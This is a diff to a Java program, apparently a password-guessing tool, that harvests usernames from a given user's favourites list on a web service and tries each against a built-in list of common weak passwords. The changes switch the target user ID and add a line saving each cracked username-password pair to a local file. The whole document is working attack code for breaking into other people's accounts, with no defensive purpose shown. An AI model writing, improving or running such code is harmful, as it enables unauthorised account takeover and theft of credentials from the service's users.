@@ -19,7 +19,7 @@ public class PasswordMain {
 		
 		List<String> myList = new ArrayList<String>();
 		List<String> pswList = getSimplePasswords();
-		for (String userId : getFavoriteUsers("61536")) {
+		for (String userId : getFavoriteUsers("66845")) {
 			myList.add(getUserName(userId));
 		}
 		for (String user : myList) {
@@ -28,15 +28,16 @@ public class PasswordMain {
 //					break;
 //				}
 				
-				String ru = loginWeApp(user, user);
-				if(ru!=null){
-					System.out.println(ru);
-					break;
-				}
+//				String ru = loginWeApp(user, user);
+//				if(ru!=null){
+//					System.out.println(ru);
+//					break;
+//				}
 				
 				String res = loginWeApp(user, s);
 				if(res!=null){
 					System.out.println(res);
+					ReadFileUtil.writeTxtFile("D:\\Documents\\we\\pw.txt", user+"-"+s);
 					break;
 				}
 			}
@@ -46,7 +47,7 @@ public class PasswordMain {
 	public static List<String> getSimplePasswords() {
 		String s = "000000、111111、11111111、112233、123123、123321、123456、12345678、654321、"
 				+ "666666、888888、88888888、abcdef、abcabc、a1b2c3、aaa111、123qwe、qq123456、qqq123456"
-				+ "qwerty、qweasd、admin、password、p@ssword、passwd、iloveyou、5201314";
+				+ "qwerty、admin、password、p@ssword、passwd、iloveyou、5201314";
 		String[] ss = s.split("、");
 		List<String> list = new ArrayList<String>();
 		for (String str : ss)
